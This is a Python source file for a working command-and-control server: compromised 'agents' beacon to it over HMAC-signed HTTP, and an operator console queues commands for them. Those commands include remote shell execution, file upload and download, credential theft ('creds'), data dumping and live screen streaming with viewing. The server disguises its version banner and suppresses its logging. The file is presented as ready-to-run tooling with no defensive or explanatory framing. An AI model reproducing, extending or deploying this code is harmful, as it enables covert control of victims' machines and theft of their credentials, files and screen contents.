# server.py — double-click. Python 3.11+. stdlib only. Console stays open.
import base64, hmac, hashlib, json, os, queue, sqlite3, tempfile, threading, time, uuid
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from urllib.parse import urlparse

SECRET = "sk_c2_7Kx9mP2vN4qR8tW1yZ5bH3jL6nF0dS_aE9cU2gI4oM"
HOST   = "0.0.0.0"
PORT   = 8443

DB = sqlite3.connect(":memory:", check_same_thread=False)
DB.execute("CREATE TABLE jobs (id TEXT PRIMARY KEY, agent TEXT, cmd TEXT, state TEXT, out TEXT, ts REAL)")
DB.execute("CREATE TABLE agents (id TEXT PRIMARY KEY, host TEXT, user TEXT, first REAL, last REAL, stream INT)")
DB.commit()
LOCK = threading.Lock()
PENDING = {}
PENDING_LOCK = threading.Lock()
FRAMES = {}
FRAMES_LOCK = threading.Lock()

def q_for(aid):
    with PENDING_LOCK: return PENDING.setdefault(aid, queue.Queue())

def sign(s, p): return hmac.new(s.encode(), p, hashlib.sha256).hexdigest()
def verify(s, p, m): return hmac.compare_digest(sign(s, p), m or "")

class H(BaseHTTPRequestHandler):
    server_version = "api/1.4"; sys_version = ""; SECRET = ""
    def log_message(self, *a): pass
    def _send(self, c, b, ct="application/json"):
        self.send_response(c); self.send_header("Content-Type", ct)
        self.send_header("Content-Length", str(len(b))); self.end_headers(); self.wfile.write(b)
    def do_POST(self):
        path = urlparse(self.path).path
        n = int(self.headers.get("Content-Length", 0))
        raw = self.rfile.read(n) if n else b""
        if not verify(self.SECRET, raw, self.headers.get("X-Sig","")):
            return self._send(401, b'{"e":"auth"}')
        try: d = json.loads(raw)
        except Exception: return self._send(400, b'{"e":"json"}')
        if path == "/beacon":
            aid = d["id"]; now = time.time()
            with LOCK:
                row = DB.execute("SELECT first,stream FROM agents WHERE id=?", (aid,)).fetchone()
                first = row[0] if row else now
                stream = row[1] if row else 0
                DB.execute("INSERT OR REPLACE INTO agents VALUES (?,?,?,?,?,?)",
                           (aid, d.get("host",""), d.get("user",""), first, now, stream))
                DB.commit()
            try: job = q_for(aid).get(timeout=20)
            except queue.Empty:
                return self._send(200, json.dumps({"job":None,"stream":bool(stream)}).encode())
            with LOCK:
                DB.execute("UPDATE jobs SET state='running' WHERE id=?", (job["id"],)); DB.commit()
            return self._send(200, json.dumps({"job":job,"stream":bool(stream)}).encode())
        if path == "/report":
            with LOCK:
                DB.execute("UPDATE jobs SET state='done', out=? WHERE id=?",
                           (d.get("out",""), d["id"])); DB.commit()
            return self._send(200, b'{"ok":1}')
        if path == "/frame":
            aid = d["id"]
            try: jpg = base64.b64decode(d["jpg"])
            except Exception: return self._send(400, b'{"e":"b64"}')
            with FRAMES_LOCK: FRAMES[aid] = jpg
            return self._send(200, b'{"ok":1}')
        return self._send(404, b'{"e":"route"}')

def submit(agent, cmd, arg=""):
    jid = uuid.uuid4().hex[:12]
    with LOCK:
        DB.execute("INSERT INTO jobs VALUES (?,?,?,?,?,?)",
                   (jid, agent, f"{cmd}|{arg}", "queued", "", time.time())); DB.commit()
    q_for(agent).put({"id": jid, "cmd": cmd, "arg": arg}); return jid

def _resolve(cur):
    if not cur: return None
    with LOCK: rows = [r[0] for r in DB.execute("SELECT id FROM agents")]
    for r in rows:
        if r.startswith(cur) or r == cur: return r
    return None

def _open_file(path):
    try:
        if os.name == "nt": os.startfile(path)
        elif sys.platform == "darwin": os.system(f"open '{path}'")
        else: os.system(f"xdg-open '{path}' &")
    except Exception as e: print(f"[relay] open fail: {e}")

def console():
    print("[relay] list | use <id> | shell <c> | getf <p> | putf <p> |"
          " grab | creds | rename | dump | stream on|off | view | out <jid> | quit")
    cur = None
    while True:
        try: line = input("relay> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[relay] bye"); return
        if not line: continue
        if line == "quit": return
        if line == "list":
            with LOCK: rows = list(DB.execute("SELECT id,host,user,last,stream FROM agents"))
            if not rows: print("[relay] no agents yet")
            for r in rows:
                mark = "REC" if r[4] else "   "
                print(f"  {r[0][:10]}  {r[1]:20}  {r[2]:15}  {int(time.time()-r[3]):>4}s  {mark}")
            continue
        if line.startswith("use "):
            cur = line[4:].strip(); print(f"[relay] target {cur}"); continue
        if line.startswith("out "):
            with LOCK:
                r = DB.execute("SELECT cmd,state,substr(out,1,2000) FROM jobs WHERE id=?",
                               (line[4:].strip(),)).fetchone()
            print(r if r else "[relay] no job"); continue
        full = _resolve(cur)
        if not full: print("[relay] no target"); continue
        if line == "stream on" or line == "stream off":
            v = 1 if line.endswith("on") else 0
            with LOCK: DB.execute("UPDATE agents SET stream=? WHERE id=?", (v, full)); DB.commit()
            print(f"[relay] stream {'on' if v else 'off'} for {full[:10]}"); continue
        if line == "view":
            with FRAMES_LOCK: jpg = FRAMES.get(full)
            if not jpg: print("[relay] no frame yet (turn stream on)"); continue
            p = os.path.join(tempfile.gettempdir(), f"frame_{full[:8]}.jpg")
            open(p, "wb").write(jpg)
            print(f"[relay] frame -> {p} ({len(jpg)//1024} KB)")
            _open_file(p); continue
        matched = False
        for k in ("shell","getf","putf","screen","grab","creds","rename","dump"):
            if line == k: print(f"[relay] queued {submit(full, k)}"); matched = True; break
            if line.startswith(k + " "):
                print(f"[relay] queued {submit(full, k, line[len(k)+1:])}"); matched = True; break
        if not matched: print("[relay] ?")

def main():
    H.SECRET = SECRET
    try: srv = ThreadingHTTPServer((HOST, PORT), H)
    except OSError as e:
        print(f"[relay] port {PORT} busy: {e}"); input("enter..."); return
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    print(f"[relay] up on {HOST}:{PORT}")
    try: console()
    except Exception as e:
        print(f"[relay] crash: {e}"); input("enter...")
    finally: srv.shutdown()

if __name__ == "__main__":
    main()